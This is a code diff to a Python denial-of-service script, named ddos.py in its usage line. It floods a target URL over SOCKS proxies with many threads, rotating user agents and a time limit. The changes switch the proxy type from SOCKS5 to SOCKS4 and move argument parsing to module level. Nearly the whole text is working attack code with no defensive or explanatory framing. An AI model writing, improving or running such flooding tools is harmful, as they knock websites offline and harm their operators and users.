@@ -39,7 +39,7 @@ def startAttack():
     headers = "GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: Keep-Alive\r\n" + accept + "\r\nUser-Agent: " + userAgent + "\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
     while True: 
         conn = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM, 0)
-        conn.set_proxy(socks.SOCKS5, proxyAddr[0], int(proxyAddr[1]))
+        conn.set_proxy(socks.SOCKS4, proxyAddr[0], int(proxyAddr[1]))
         conn.settimeout(3)
         try:
             conn.connect((host, port))
@@ -61,15 +61,15 @@ def startAttack():
                 break
         conn.close()
 if len(sys.argv[1:]) != 4:
-    print("Usage: python3 hehe.py <URL> <THREADS> <TIME> <PROXY FILE>")
+    print("Usage: python3 ddos.py <URL> <THREADS> <TIME> <PROXY FILE>")
     sys.exit()
+host, port, path = urlParser(sys.argv[1])
+threads = int(sys.argv[2])
+floodTime = int(sys.argv[3])
+proxyFile = sys.argv[4]
+proxies = readFile(proxyFile)
+userAgents = getUserAgents()
 def main123():
-    host, port, path = urlParser(sys.argv[1])
-    threads = int(sys.argv[2])
-    floodTime = int(sys.argv[3])
-    proxyFile = sys.argv[4]
-    proxies = readFile(proxyFile)
-    userAgents = getUserAgents()
     for i in range(threads):
         thread = threading.Thread(target=startAttack, daemon=True)
         thread.start()
@@ -79,7 +79,6 @@ def main123():
             break
         except KeyboardInterrupt:
             break
-
 
 import multiprocessing
 print("Attacking...")
